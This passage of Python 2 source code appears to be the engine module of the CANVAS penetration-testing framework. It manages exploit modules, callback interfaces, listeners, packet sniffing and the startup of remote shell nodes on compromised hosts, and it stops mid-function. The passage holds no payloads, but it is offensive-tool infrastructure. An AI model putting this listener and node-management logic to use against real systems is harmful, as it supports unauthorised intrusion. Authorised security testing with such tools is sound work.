    If the callback is coming back to a MOSDEFSock, this class is not used.
    
    We're threaded to get the socket work out of the Main thread. You don't want to
    do any of the slow stuff we do in the gui thread.
    """
    def __init__(self):
        Thread.__init__(self, verbose=debug_threads)
        self.setDaemon(1)
        self.engine=None
        self.listener=None
        self.newsocket=None
        self.newip=None
    
    def log(self,msg):
        self.engine.log(msg)
        
    def run(self):
        self.log("Starting our new listener!")
        newshell=self.engine.new_node_connection(self.listener,self.newsocket, self.newip)
        
        if newshell in [0]:
            #failed to get our new listener!
            devlog("engine", "Failed to get a new listener - did it die while we were doing startup?")
            return 0
        
        self.listener.lastnewnode=newshell
        devlog("Started up new node")
        newshell.started=1
        try:
            fd=self.newsocket.fileno()
        except:
            self.log("Failed to init new shell server. :<")
            #failed. :<
            return 1
        #if newshell.parentnode.nodetype=="LocalNode":
        #    id1 = self.engine.gui.input_add(newsocket, self.gui.get_input_read(), lambda x,y:self.activeListener(newshell.shell,x,y))
        return 


class hostadder(Thread):
    """
    This class is used to put all host adding into its own thread
    Otherwise the gui can potentially lock up...
    """
    def __init__(self,kline,host):
        Thread.__init__(self, verbose=debug_threads)
        self.setDaemon(1)
        self.host=host
        self.kline=kline
    
    def run(self):
        kLine=self.kline
        host=self.host
        node=kLine.parent
        #gethostbyname can potentilly time out...rocky has all sorts of issues here
        host=node.gethostbyname(host) #always use the IP
        if host in node.get_all_known_hosts():
            return
        
        newhost=node.new_host(host)
        #newhost.add_knowledge("OS: %s"%os) #add later
        #self.gui.addknownhost(newhost,None,None)
        return

class canvasengine:
    """
    This class has all the canvas logic in it - hopefully none of the GTK stuff will slip in here...
    """
    #Constants
    
    #valid modes for osdetect: 
    ASSUME_ONE_LANG="Assume One Language" #assume we are English
    ASSUME_NEAREST_NEIGHBOR="Assume Nearest Neighbor" #assume we are similar to our neighbors
    ASSUME_NO_RUN="Assume Don't Run" #don't run if we can't get the language/sp

    #functions
    
    def __init__(self, gui = None, silica=False):
        devlog("engine", "Intializing engine")
        #print "New engine initializing with gui = %s"%gui
        self.allexploits=[]
        
        self.debug=0
        self.logfile=None
        self.silica=silica

        # dictionary for session-based logging
        # in the form: node_logging_sessions[IP] => [ timestamp, current_log_file ]
        self.node_logging_sessions = {}
        self.current_logging_host  = None
        
        #dictonary of our http mosdef listeners sorted by port
        self.http_mosdef_listeners={}
        
        self.passednodes=[]
        self.notnewgui=0 #1 for old gui
        #turn this on for debugging prints - good if the gui is broken
        self.localnode=None
        self.allListeners=[]
        self.nodeList=[]
        self.useAutoListener=1 #1 for start a new listener when none is selected
        
        # XXX XXX XXX XXX
        # engine well broken.
        # we should rethink where to place config-related code
        # to overwrite default, or have a config.loaddefault() function.
        # XXX XXX XXX XXX
        
        # Overide some config stuff in SILICA we don't need them
        if self.silica:
            CanvasConfig['sniffer']=False
            CanvasConfig['sound']=False
            CanvasConfig['VersionCheck']=False
            CanvasConfig['geoip']=False
            
        self.config = CanvasConfig
         
        # XXX XXX XXX XXX
        #      FIXME 
        # XXX XXX XXX XXX

        # XXX: needed for commandline-gui situations like testframework :/
        # need a way to seperate this...perhaps I can set it in the test
        # framework ? Main thing is: defaultgui != real-gui..or something
        # not very clear design.
        if gui == None:
            from gui.defaultgui import defaultgui
            gui = defaultgui(handle_callbacks=1)

        #else: # command line?
        #    #print "Registering default modules"
        #    for m in defaultmodules:
        #        registerModule(m)
        registerSomeModules(defaultmodules)
        self.gui = gui
        # XXX XXX XXX XXX
        
        self.country_exclude_list=[]
        try:
            f=file("country_exclude_list")
            self.country_exclude_list=f.readlines()
        except:
            self.log("No country exclude list loaded")

        #future iterations of this need to be per-host. Each host can have N listeners
        self.maxListenerId=0
        
        banner = "[*] CANVAS Started [*]\n"
            
        self.log(banner)
        #try:
        #    IP=getAllLocalIPs()[-1]
        #except:
        #    IP="127.0.0.1"
                
        #self.gui.setLocalIP(IP)

        self.knownhosts=[]
        self.idlock=RLock()
        self.covertness = int(self.config['default_covertness', "1"]) #default is very reliable
        node=self.loadLocalNode()
        node.engine=self
        node.findLocalHosts()
        
        self.localsniffer=None #we need this to define the variable
        self.callback_interface=None
        
        # set target
        if self.config['default_target_ip']:
            target = node.get_known_host(self.config['default_target_ip'])
            print "Using default target ip <%s>" % self.config['default_target_ip']
        else:
            target = node.get_first_known_host()
        
        # XXX: replaced by a method that also updates the gui ..
        #self.target_hosts=[target]
        #target.set_as_target()
        
        self.target_hosts = [target]
        target.set_as_target()
        self.set_target_host(target)
        
        self.reset_callback_interface()

        self.set_first_node(node) #select this node by default - some exploits use this

        to_ip=node.interfaces.get_last()

        self.nodeTree=node
        self.snifferfilterstring="ip(%s)"%self.callback_interface.ip
        if self.config['sniffer']:
            self.initLocalSniffer()
        

        #CANVAS WORLD SERVICE DEFAULTS
        self.cws=None
        self.cwsusername=None
        self.cwspassword=None
        
        #LANGUAGE AND SP DETECTION DEFAULTS (essentially configuration)
        
        self.osdetect_mode=canvasengine.ASSUME_ONE_LANG
        self.osdetect_lang="English" #language to assume if we need to

        #smartlist loading
        self.smartlist=load_smartlist()
        
        if self.silica:
            time.sleep(1)
            self.config["guitimestamps"] = "No" # SILICA doesn't want the timestamps
            self.log("SILICA - Protoplasm, Ver. 5.0")
        else:
            myversioncheck=versioncheck.versionchecker(self)
            myversioncheck.start()
        
        # Let's check whether we need to startup a default listener
        # as dictated in the canvas.conf file
        if self.config['auto_listener']:
            newinterface=self.localnode.getMatchingInterface(self.config["auto_listener_interface"])
            self.start_listener( newinterface, self.config["auto_listener_type"], int(self.config["auto_listener_port"]), self.config["auto_listener_createthread"] )
        
        # Session-based logging as defined in the conf file
        if self.config["session_logging"]:
            if not os.path.exists( self.config["session_log_folder"] ):            
                try:
                    os.mkdir( self.config["session_log_folder"] )
                except:
                    # if there's a problem flip logging off
                    self.config["session_logging"] = 0
                            
        # new shell startup mutexing
        self.newshell_mutex = mutex.mutex()
        
        return 

    def run_commandline(self, commandline):
        """
        Runs a commandline that was passed to us from the GUI
        
        This should be in its own thread, not the GUI thread!
        
        """
        #empty?
        if not commandline:
            return 
        
        self.log("Running commandline from GUI: %s"%commandline)
        modulename=commandline.split(" ")[0]
        args=" ".join(commandline.split(" ")[1:])
        try:
            app=self.getModuleExploit(modulename)
        except CANVASENGINEException:
            #no module named that.
            self.log("No module named: %s"%modulename)
            return False
        self.addExploitLine(app)
        commandline_fromengine(app, self.passednodes, args)
        return True 
    
    def reset_callback_interface(self):
        """
        Called on __init__ to set a default callback interface, but also called
        when a node is closed that has our callback interface on it - we reset that to
        our LocalNode's callback
        """
        node=self.localnode
        # set callback
        if self.config['default_callback_ip']:
            callback = node.interfaces.get_ip(self.config['default_callback_ip'])
            assert callback != None, "No interface with ip address %s available" % (self.config["default_callback_ip"])
            print "Using default callback ip <%s> with interface <%s>" \
                % (callback.ip, callback.interface)
        elif self.config['default_callback_interface']:
            callback = node.interfaces.get_interface(self.config['default_callback_interface'])
            if callback:
                print "Using default callback interface <%s> with ip <%s>" \
                      % (callback.interface, callback.ip)
        else:
            callback = node.interfaces.get_last("ipv4")
            
        assert callback, "could not get default interface, something is going wrong"
        self.set_callback_interface(callback) #CALL BACK TO THIS IP
        callback.set_as_callback()
        return 
    
    def connectcws(self,username,password,host,port):
        """store this off for later and test our connection"""
        import xmlrpclib
        port=int(port)
        self.cwsusername=username
        self.cwspassword=password
        server=xmlrpclib.ServerProxy("http://%s:%s/"%(host,port))
        self.cws=server
        data=server.system.listMethods()
        self.log("CWS Connected: %s"%data)
        self.log(self.cws.cws.fortune.successfortune(self.getcwskey()))
        return
    
    def getcwskey(self):
        #right now we ignore username and password        
        return ""
        
    def shutdown(self):
        """
        This function is responsible for stopping any threads only the engine
        knows about
        """
        try:
            self.localsniffer.shutdown()
        except:
            devlog('LocalSniffer', "No localsniffer to shutdown")
        return
    
    def getModuleExploit(self,modulename):
        """
        Gets a new exploit and assigns its engine
        to us.
        
        Example
        getModuleExploit("connecttoservice")
        """
        newexploit=getModuleExploit(modulename)
        newexploit.engine=self
        return newexploit
    
    def getAllModules(self):
        ret=[]
        for module in registeredModuleList():
            ret+=[self.getModule(module)]
        return ret 
                
    def getModulesOfType(self, moduletype):
        """
        Used by automater utilities - returns a list of modules of a given type (in PROPERTY)
        """
        return self.getModulesByProperty("TYPE", moduletype)
    
    def getModulesByProperty(self, key, value):
        ret=[] #list of all modules of type moduletype
        #print "In getModules(%s)"%moduletype
        for module in self.getAllModules():
            #print "Module %s"%module.NAME
            if hasattr(module, "PROPERTY"):
                #print "Module %s type: %s"%(module.NAME, module.PROPERTY.get(key))
                if module.PROPERTY.get(key)==value:
                    ret+=[module]
        return ret 
        
    def getModule(self,modulename):
        return getModule(modulename)
    
    def initLocalSniffer(self):
        """
        The localsniffer operates in its own thread, and recvs packets continually
        and when you've assigned a callback, will also send you the packets
        If you are not running as root, or Admin on a support win32 interface,
        you won't be able to sniff and some moduleses won't work.
        
        This interface is meant to replace the older sniffer interface,
        which relied on tethereal and pipes.
        """
        
        try:
            self.localsniffer = localsniffer(engine=self)
        except:
            print "No local sniffer...CRI version"
            return 0
        if not self.localsniffer.running():
            #self.log("Could not open sniffer - not running as root/admin?")
            self.sniffer_log("Sniffer open failed - Sniffing and some modules disabled!")
            return 0
        
        self.localsniffer.start()
        self.sniffer_log("Sniffer filter string set to: %s"%self.snifferfilterstring)
        # Why register a callback that does nothing?
        #self.register_sniffer_callback(self.sniffer_active,self.snifferfilterstring)
        self.sniffer_log("Started Sniffer!")
        return 1
    
    def register_sniffer_callback(self,callback,filterstring): # here we could add restartparser option later
        # XXX sometimes sniffer can not start, and we have self.localsniffer = None
        # FIXME we catch AttributeError for now, but miss a better way
        devassert('all', self.localsniffer, "self.localsniffer is %s" % self.localsniffer)
        try:
            self.localsniffer.registercallback(callback,filterstring)
        except AttributeError:
            pass
        return
    
    def unregister_sniffer_callback(self,callback):
        devassert('all', self.localsniffer, "self.localsniffer is %s" % self.localsniffer)
        try:
            self.localsniffer.unregistercallback(callback)
        except AttributeError:
            pass
        return
    
    def sniffer_isactive(self):
        """
        return True if localsniffer is active, False else.
        """
        try:
            return self.localsniffer.running()
        except AttributeError:
            #if sniffer was disabled from canvas.conf we don't have a localsniffer object.
            return False
    
    def sniffer_active(self,parser): # this is a callback...
        #don't do this
        #self.sniffer_log(parser.getline())
        return
    
    def sniffer_log(self,message,color=DEFAULTCOLOR):
        message+="\n"
        #don't do this for threading reasons...
        #if for every packet we generate a gui_queue message, then we get
        #into an infinite loop, since our sniffer will see the packets the
        #gui_queue generates...
        #self.gui.gui_queue_append("snifferlogmessage",[message,color])
        return

    def openlogfile(self):
        """
        Opens the log file for appending to it in ascii mode
        if we cannot open the default name of CANVAS.log, then 
        we open CANVAS.log.PID
        
        We open this file in the CANVAS root directory (as set by engine.config)
        """
        if self.logfile==None:
            try:
                logfilename=os.path.join(canvas_root_directory, "CANVAS.log")
                logfilename_back=os.path.join(canvas_root_directory, "CANVAS.bak")
                #back this up and erase the old backup if we're getting large
                filesize_backup(logfilename, logfilename_back, 1000000)
                self.logfile=open(logfilename,"a+")
            except IOError:
                logfilename=os.path.join(canvas_root_directory, "CANVAS.log.%d"%os.getpid())
                self.logfile=open(logfilename,"a+")
            self.logfile.write("\n**************\nNew session started!\n")
        return
    
    def writetologfile(self,message):

        if len(message) and message[-1] != "\n":
            cr = "\n"
        else:
            cr = ""
        if self.config["timestamps"]=="yes":
            timestamp="[ "+time.asctime()+" ]"
        self.logfile.write(timestamp+message+cr)
        self.logfile.flush()
    
    
    def log_session( self, message ):
        
        if self.current_logging_host is not None:
            clean_host = self.current_logging_host.replace(".","-")
        else:
            if "(" in message and ")" in message:
                clean_host = message.split("/")[0]
                clean_host = clean_host.split("(")[0]
                print "Clean Host: %s" % clean_host
            else:
                return message
                
        now   = datetime.now()
        
        if self.node_logging_sessions.has_key( self.current_logging_host ):

            # We check to make sure this shouldn't be tracked
            # as a new session, the threshold for splitting a session
            # is defined in the canvas.conf file
            delta = now - self.node_logging_sessions[ self.current_logging_host ]
            
            file_path = "%s/%s/" % (self.config["session_log_folder"], clean_host)

            if delta.seconds > int(self.config["session_logging_threshold"]):
                
                # We just need to cap the old file
                # and fire up a new one
                # DDMMYYYY-HH_MM_SS-HH_MM_SS.log
                file_path = "%s/%s/" % (self.config["session_log_folder"], clean_host)
                old_time  = self.node_logging_sessions[ self.current_logging_host ]
                
                logfile_name = "%2d%2d%2d--%2d_%2d_%2d--%2d_%2d_%2d.log" % (old_time.day, old_time.month, old_time.year, old_time.hour, old_time.minute, old_time.second, now.hour, now.minute, now.second )
                logfile_name = logfile_name.replace(" ","0")
                
                shutil.copy( "%s/temp.log" % file_path, "%s/%s" % ( file_path, logfile_name ))
                os.remove( "%s/temp.log" % file_path )

                self.node_logging_sessions[ self.current_logging_host ] = now

            fd = open( "%s/temp.log" % file_path, "a" )
            fd.write( message )
            fd.close()
        else:
            self.node_logging_sessions[ self.current_logging_host ] = now
            file_path = "%s/%s/temp.log" % (self.config["session_log_folder"], clean_host)
            
            try:
                os.mkdir( "%s/%s" % ( self.config["session_log_folder"], clean_host))
                
            except OSError:
                
                # We will use the creation time of the file to create
                # a backup of the last changes to the temp.log
                last_mod = datetime.fromtimestamp(os.stat( file_path ).st_ctime)
                new_file = "%2d%2d%2d--%2d_%2d_%2d_bak.log" % ( last_mod.day, last_mod.month, last_mod.year, last_mod.hour, last_mod.minute, last_mod.second)
                new_file = new_file.replace(" ","0")
                shutil.copy( file_path, "%s/%s/%s" % (self.config["session_log_folder"], clean_host, new_file ))
                os.remove( file_path )
                
            fd = open( file_path, "a")
            fd.write( message )
            fd.close()
            
        return message 
    
    
    def log(self,message,color=DEFAULTCOLOR,enter="\n",maxlength=130,startlength=80):
        """
        Might be run in the thread context of the exploit, and not the gui
        
        maxlength and startlength are for our "smart" word break algorithm. We want
        to avoid having super long lines, but we also want to break lines when
        we have to. This routine does some basic processing to try to make our logs
        not look horrible.
        """
        #print "Canvasengine maxlength=%d message=%s"%(maxlength,message[:50])
        if self.debug:
            print message
        self.openlogfile()

        #this little ditty splits the lines up, then makes a maximum length for each line
        messagelines=message.split(enter)
        messagelines2=[]
        for m in messagelines:
            i=0
            while m!="":
                #check to see if all we have left is something small
                if len(m)<startlength:
                    messagelines2+=[m+enter]
                    m=""
                    break
                #devlog("logging","length of m(%d) m=%s"%(len(m),prettyprint(m[:15])))
                #m is > startlength, so we need to start looking for a space to word break it
                spaceindex=m[startlength:].find(" ")
                if spaceindex==-1 or spaceindex>maxlength-startlength:
                    #we didn't find a space to word break, so we need to 
                    #break the line at the maximum length, sorry
                    #devlog("logging","Didn't find a space, sorry")
                    m2=m[:maxlength]
                    messagelines2.append(m2+enter)
                    m=m[maxlength:]
                    continue
                #otherwise, we have found a space, so we'll break there...
                #devlog("logging","Space found: %d"%spaceindex)
                m2=m[spaceindex+startlength+1:] #plus 1 for the space (we don't need it)
                messagelines2.append(m[:spaceindex+startlength]+enter)
                m=m2
      
        # This is for displaying timestamps in the GUI
        do_timestamp = self.config["guitimestamps"]
        
        if do_timestamp == "yes":
            joiner="[ "+time.asctime()+" ]"
        else:
            joiner=""

        message = joiner

        for msg in messagelines2:
            message += msg
        
        # If we have session logging enabled in the conf
        # file we send a flag that we split out here
        if CanvasConfig["session_logging"]:
            message = self.log_session( message )
        
        message = message.replace("\n\n", "\n")
               
        self.writetologfile(message)
        #print "About to send GUI a log"
        # XXX should not have gui in engine
        if self.gui:
            self.gui.gui_queue_append("logmessage",[message,color])
        else:
            # XXX TODO ...
            if message[-1] == '\n':
                message = message[:-1]
            print "GUI> " + message

        return

    def debuglog(self, message, color=DEFAULTCOLOR,enter="\n"):
        """
        Might be run in the thread context of the exploit, and not the gui
        """
        if self.debug:
            print message
        # we will comment this mindtime
        #if self.logfile==None:
        #    self.logfile=open("CANVAS.log","a+")
        #    self.logfile.write("\n**************\nNew session started!\n")
        #self.logfile.write(message+"\n")
        #self.logfile.flush()
        #print "About to send GUI a log"
        # XXX should not have gui in engine
        if self.gui:
            self.gui.gui_queue_append("debugmessage",[message,color])
        #self.gui.log(message,color,check=check)
        return

    def DataViewColumns(self, args):
        if self.gui:
            self.gui.gui_queue_append("set_data_view_columns",[args])
        return

    def DataViewInfo(self, args):
        if self.gui:
            self.gui.gui_queue_append("set_data_view_info",[args])
        return
        
    def threads_enter(self):
        #print "Engine: Thread enter."
        # XXX should not have gui in engine
        self.gui.gdk.threads_enter()
        return
    
    def threads_leave(self):
        #print "Engine: Thread leave."
        # XXX should not have gui in engine
        self.gui.gdk.threads_leave()
        return
        
    def closeSniffer(self):
        if self.snifferpipe!=None:
            # XXX should not have gui in engine
            if self.gui:
                self.gui.input_remove(self.sniffergtkid)
            self.snifferpipe=None
            self.log("Closed old sniffer")
        return

    def successfortune(self):
        """logs a funny fortune from fortunes.txt"""

        if self.cws:
            self.log(self.cws.cws.fortune.successfortune())
            return 
        global fortunes

        if len(fortunes)==0:
            # no fortunes, so we just return
            return 
        
        global currentfortune
        if currentfortune==(len(fortunes)-1):
            currentfortune=0
        else:
            currentfortune+=1
            
        if self.gui: # DO I NEED THIS HERE?
            self.gui.play("OWN") 
        self.log(fortunes[currentfortune].replace("&", "\n"), color="red")
        return
      
    def activeSniffer(self,source,condition):
        newline=self.snifferpipe[1].readline()
        if newline=="":
            self.log("Recieved blank line from sniffer, closing")
            self.closeSniffer()
            return
        #print "New Sniffer Line: "+newline
        # XXX should not have gui in engine
        if self.gui:
            self.gui.addSnifferLine(newline)
        return
    
    def setSnifferFilterstring(self,filterstring):
        self.snifferfilterstring=filterstring
        return
        
    def set_covert_value(self,value):
        """
        Used by the gui to change our covert value
        """
        oldc = self.covertness
        self.covertness = round(value)
        if self.covertness != oldc:
            self.log("Global covertness value set to %d" % self.covertness)
        return self.covertness
        
    def getCovertness(self):
        """
        In the future, this can do something interesting with the targetip - like see if it's
        an important host...
        """
        return self.covertness
    
    def exploitlog(self,message, color="black", enter="\n"):
        self.log(message,color, enter)
        
    def exploitdebuglog(self, message, color="black", enter="\n"):
        self.debuglog(message, color, enter)
    
    def addExploitLine(self,exploit):
        """
        This can be called from any thread
        """
        #print "Registering new exploit..."
        # XXX should not have gui in engine
        self.gui.gui_queue_append("Register New Exploit",[exploit])
        self.allexploits.append(exploit)
        return 
    
    def haltAllExploits(self):
        """
        Sends the halt signal to every exploit we remember
        """
        for e in self.allexploits:
            e.halt()
        return 

    def clearAllExploits(self):
        """
        Forget about all the exploits we've run. Useful for Silica
        """
        self.allexploits=[]
        return 
    
    def clearLocalNode(self):
        """ 
        This function is used by silica when it initializes after
        attaching to a new network. At this point we should not know about 
        any hosts yet.
        """
        self.localnode.init_me(silica=True)
        return 
        
    def addLine(self,obj):
        """
        This function just appends the object to the addLine gui queue
        """
        #print "canvasengine::addLine(%s)"%obj
        if not self.gui:
            return
        self.gui.gui_queue_append("addLine",[obj])      
  
    def deleteLine(self,obj):
        """
        ThreadSafe way to delete a line from our new GUI 
        """
        #print "canvasengine::deleteLine(%s)"%obj        
        if not self.gui:
            return
        self.gui.gui_queue_append("deleteLine",[obj])      

    def update(self,obj):
        """
        Perfectly safe to call from any thread - but almost always called
        from a non-main thread.
        """
        #print "canvasengine:update(%s)"%obj
        if not self.gui:
            return
        self.gui.gui_queue_append("update",[obj])

    def addNode(self,node):
        self.nodeList+=[node]
        devlog('canvasengine::addNode', "Adding node with parent: %s" % node.parent)
        self.gui.gui_queue_append("addNode",[node])
        return 
    
    def addListener(self,mylistener):
        self.allListeners.append(mylistener)
        #print "SETTING ENGINE"
        mylistener.setEngine(self)
        self.addLine(mylistener)
        return

    def removeListener(self,mylistener):
        """removes a listener from the gui display"""
        id=mylistener.getID()
        print "removing listener %d"%id
        self.gui.gui_queue_append("Remove Listener",[id])
        #self.gui.removeListener(id)
        self.allListeners.remove(mylistener)
        return
    
    def getListenerListenerBySock(self,sock):
        return self.getListenerBySock(sock)

    def getActiveListenerBySock(self,sock):
        return self.getListenerBySock(sock)

    def set_target_host(self,targethost):
        """
        NEWGUI support
        Sets the interface used by the shellcode creation tools to call back to
        when needed
        """

        if type(targethost) == type(""):
            #if we are a string (aka, an ip address), then lets get the currently selected nodes knowledge\
            ip=targethost
            targethost=self.passednodes[0].get_known_host(ip)
            if targethost==None:
                devlog("canvasengine", "Did not find %s in the node's host knowledge!"%ip)
            #now targethost is a host object
            
        
        #here we unset the older targets
        oldhosts=self.target_hosts[:]
        for oldtarget in oldhosts:
            #don't unset our target - that would be bad
            if oldtarget==targethost:
                continue
            if(oldtarget == None):
                devlog("canvasengine", "Empty target host provided!")
                continue
            oldtarget.unset_as_target()
            if self.gui:
                self.update(oldtarget)
        
        #now we set our target as the only member of our targets list
        self.target_hosts=[targethost]
        #and update its gui
        if self.gui:
            # targethost is a hostKnowledge line
            self.gui.gui_queue_append("set target ip", [targethost.interface])
            self.update(targethost)
        return

    def set_additional_target_host(self, target_host):
        """
        Set another target host in our list
        """
        if target_host in self.target_hosts:
            #no need to add this host to our target hosts list
            return 
        self.target_hosts.append(target_host)
        if self.gui:
            # add all target ip's to the display list
            IPlist = []
            for target in self.target_hosts:
                IPlist.append(target.interface)
            self.gui.gui_queue_append("set target ip", [' + '.join(IPlist)])
            self.update(target_host)
        return 
    
    def unset_target_host(self, target_host):
        """
        Unsets target host. Will fail if the target host is our primary target
        (self.target_hosts[0])
        """
        if self.target_hosts[0]==target_host:
            devlog("canvasengine", "Cannot unset primary target host")
            return False #failed
        
        if target_host not in self.target_hosts:
            devlog("canvasengine", "Cannot unset target that is not set")
            return False 
        
        self.target_hosts.remove(target_host)

        # udate gui
        if self.gui:
            # add all target ip's to the display list
            IPlist = []
            for target in self.target_hosts:
                IPlist.append(target.interface)
            self.gui.gui_queue_append("set target ip", [' + '.join(IPlist)])
            self.update(target_host)
            
        return True
        
    
    def set_first_node(self,node):
        """
        Sets this node as the first node in a nodelist
        which we pass to all modules
        """
        index=0
        for n in self.passednodes:
            #unset all these
            n.unselect()
        self.passednodes=[node]
        node.appended(index) #change display to reflect index in nodelist
        return

    def append_node(self,node):
        """appends a node to our list and updates its display"""
        index=len(self.passednodes)
        self.passednodes.append(node)
        node.appended(index) #change display to reflect index in nodelist
        return
    
    def set_callback_interface(self,interface):
        """
        NEWGUI support
        Sets the interface used by the shellcode creation tools to call back to
        when needed
        """
        assert interface
        devlog("engine","set_callback_interface called: %s"%interface)
        if self.callback_interface==interface:
            devlog("engine","set_callback_interface returned (same interface)")
            return
        if self.callback_interface!=None:
            self.callback_interface.unset_as_callback()
        #print "XXX! SETTING NEW CALLBACK INTERFACE"
        #print interface
        self.callback_interface=interface
        if self.gui:
            ifip=str(interface)
            if hasattr(interface, "ip"):
                ifip=interface.ip

            self.gui.gui_queue_append("set local ip",[ifip])
        #self.gui.setLocalIP(interface.ip) # XXX
        self.update(interface)

        #if self.localsniffer:
            # same here
            #self.unregister_sniffer_callback(self.sniffer_active)
            #self.snifferfilterstring="ip(%s)"%self.callback_interface.ip
            # Why register a callback that does nothing?
            #self.register_sniffer_callback(self.sniffer_active,self.snifferfilterstring)
            
        devlog("engine","set_callback_interface returned (updated)")
        return
    
    def get_callback_interface(self, target=None):
        """
        If you pass a target into this, it will pick your callback interface
        for you. This is especially useful when SYN scanning, because then you
        need to forge the packet from the proper IP!
        
        This is dangerous because on one hand it will return an interface object
        and on the other hand, it returns a string "IP address"
        """
        if not target:
            return self.callback_interface
        callback_ip=get_source_ip(target)
        if callback_ip==None:
            #failed to get a callback ip from that host - not routable?
            return self.callback_interface
        return callback_ip    
    
    def getListenerBySock(self,sock):
        listeners=self.allListeners
        for i in listeners:
            #print "Sock is %s - testing %s"%(str(sock),str(i.getSocket()))
            #GTK2 uses the fd, GTK1 uses the sock object - terrific.
            if i.getSocket()==None:
                continue
            try:
                if i.getSocket()==sock or i.getSocket().fileno()==sock:
                    return i
            except:
                #might be a MOSDEFSock, and we don't need to look at those
                #and they don't have fileno()
                pass
        return None

    def getListenerByID(self,id):
        """
        Gets eithar an active or listener by ID
        """
        for lst in self.allListeners:
            if lst.getID()==id:
                return lst

        return None

    

    def getExploitByID(self,id):
        """
        Gets eithar an active or listener by ID
        """
        for expl in self.allexploits:
            if expl.id==id:
                return expl
        return None
    
    def getListenerTypeByID(self,id):
        lst=self.getListenerByID(id)
        if lst==None:
            return ""
        return lst.getType()

    def getListeningListenerPort(self,id):
        lst=self.getListenerByID(id)
        if lst==None:
            return None
        return lst.getPort()
        
    def activeListener(self,shell,source,condition):
        """
        Called any time an active or listening gets any data
        """
        #gtk.threads_enter()
        print "Active Listener!"
        mylistener=self.getActiveListenerBySock(source)
        if mylistener==None:
            #print "No such mylistener!"
            #print "Couldn't find an active listener with that socket - why are we receiving data from it?!"
            return 0
        if mylistener.handleData()==0:
            #print "Removing!"
            #we have to remove it from the select() loop gtk is doing, if it was closed
            self.gui.input_remove(mylistener.getGtkID())
            #and we remove it from the window as well
            self.removeListener(mylistener)
            id=mylistener.getID()
            self.gui.gui_queue_append("Remove Listener",[id])
            #self.gui.removeListener(id)
            self.log("Removed listener %d from window since it was closed or suffered an error."%mylistener.getID())
        #gtk.threads_leave()
        #print "Returning!"
        return 1
    
    def getNewListenerId(self):
        self.idlock.acquire()
        old=self.maxListenerId
        self.maxListenerId+=1
        self.idlock.release()
        return old
    
    def newNode(self, node):
        """Takes a node and attaches it to our model"""
        self.addNode(node)
        node.update_gui()
        if self.gui: # XXX
            self.gui.gui_queue_append("do_listener_shell",[node])
        
        # we're keeping the startup call in exploitManager :>

        try:
            startup=self.getModuleExploit("startup")
            startup.link(self) #this is probably NOT what we want here. canvasengine is not an exploit instance
            startup.argsDict["passednodes"]=[node]
            startup.engine = self
            #set to primary target
            startup.target= self.target_hosts[0]
            startup.run()
        except socket.error:
            self.log("Tried to do a startup on new node and it failed for some reason")

    # for commandline interface ..        
    def start_http_mosdef(self, port, ssl=False):
        if ssl == True:
            return self.start_listener(None, HTTPMOSDEF_SSL, port)
        else:
            return self.start_listener(None, HTTPMOSDEF, port)
        
    def newShellServer(self,shell):
        if not shell.async:
            return
        node=shell.node
        #if node.type=="LocalNode":
        #    id1 = self.gui.input_add(shell.getSocket(), self.gui.get_input_read(), lambda x,y:self.activeListener(shell.shell,x,y))
        #print "GTK ID = %d"%id1
        #print "New shell is fd=%s"%shell.connection.fileno()
        self.newNode(shell)
        if self.gui: # XXX
            self.gui.gui_queue_append("do_listener_shell",[shell])
        #self.gui.do_listener_shell(shell)       
        return

    
    def handleNewListenerConnection(self, callback, source, condition):
        """
        called whenever a new listener connects to a socket
        This is run in the context of the gui thread, so no thread protection is needed.
        
        We then find the listener
        """
        #gtk.threads_enter()
        #FIXME: SER
        devlog("handleNewListenerConnection called")
        devlog("callback, source, condition=%s,%s,%s"%(callback,source,condition))
        if condition!= self.gui.get_input_read() and condition!=0:
                pass
                #return 0 SER
        #print "Handling new mylistener connection: %s %s"%(str(source),str(source))
        
        listener=callback.getListenerBySock(source)
        debugnote="""
        <noir> gui/canvasengine.py line 510
        <noir> do you have an explanation ? since it pops out randomly during sploit
          runtime
        <dave_> that means we got activity (select() returned on us) for a socket that
          we have registered. Then we go to look up which listener handles
          that socket, and we get nothing.
        """
        if listener==None:
            self.log("Error: CANVAS couldn't find a listener for that socket.")
            return
        #now we need to start a new Node on that socket
        try:
            newsocket,addr=listener.sock.accept()
        except:
            self.log("Failed to accept a new listener!")
            return 0

        self.log("Connected to by %s"%str(addr))
        self.log("Informing client that we got a connection")
        listener.informClient()
        #this has to be in a new thread
        tls=threadListenerStarter()
        tls.listener=listener
        tls.newsocket=newsocket
        tls.newip=str(addr)
        tls.engine=self
        tls.start()
        return 1
        
    
    # Shortcut for running module/exploit
    def runmod_exp(self, ename, node):
        mod=self.getModuleExploit(ename)
        mod.passedNodes=[node]
        mod.argsDict["passednodes"]=[node]
        mod.run()
        return mod
    
    
    # iterates through listener host list and if it finds the host in there
    # it means it has already been exploited
    def check_ip_state(self, listener, ip):
        for x in listener.silres:
            if x[0] == ip:
                print "IP ", ip, "is being or has already been exploited"
                return True
        print "Not found IP: ", ip, "continuing to exploit"
        return False
            

    # This will find the ip in the object and replace the state with the result
    def append_result(self, listener, ip, result):
        for x in range(len(listener.silres)):
            if listener.silres[x][0] == ip:
                listener.silres[x][1] = result
                print "Found IP: ", ip, "and replaced result with: ", result
                return True
        print "Did not find IP:", ip, "already in list"
        return False
                
    # default to inited newip so we remain backwards compatible ..
    def new_node_connection(self, listener, newsocket, newip="127.0.0.1"):
        """
        Given a socket, and a callback,  starts up a new node from that socket
        Will start in some random thread, and won't complete until the new
        Node has been started up completely.
        """
        devlog("new_node_connection")
        pnode=listener.parent.parent.parent
        devlog("pnode set to %s"%pnode)
        type=listener.type
        self.log("new_node_connection on %s"%type)

        self.log("Starting up a %s Server" % type)

        # has to be ported to newschool        
        if type == SOLARISMOSDEF_SPARC:
            from solarisNode import solarisNode
            newshell=solarisNode()
            pnode.newNode(newshell)
            import solarisMosdefShellServer
            shell=solarisMosdefShellServer.solarisshellserver(newsocket,newshell,logfunction=self.log)

        # has to be ported to newschool
        elif type == OSXMOSDEF_PPC:
            from osxNode import osxNode
            newshell=osxNode()
            devlog("1 newshell.parent: %s"%newshell.parent)
            pnode.newNode(newshell)
            devlog("2 newshell.parent: %s"%newshell.parent)
            import osxMosdefShellServer
            shell=osxMosdefShellServer.osxshellserver(newsocket,newshell,logfunction=self.log)
            devlog("3 newshell.parent: %s"%newshell.parent)

        # the new school
        elif type == OSXMOSDEF_INTEL:
            from osxNode import osxNode
            newshell    = osxNode()
            pnode.newNode(newshell)
            shell       = MosdefShellServer('OSX', 'i386')(newsocket, newshell, logfunction=self.log)
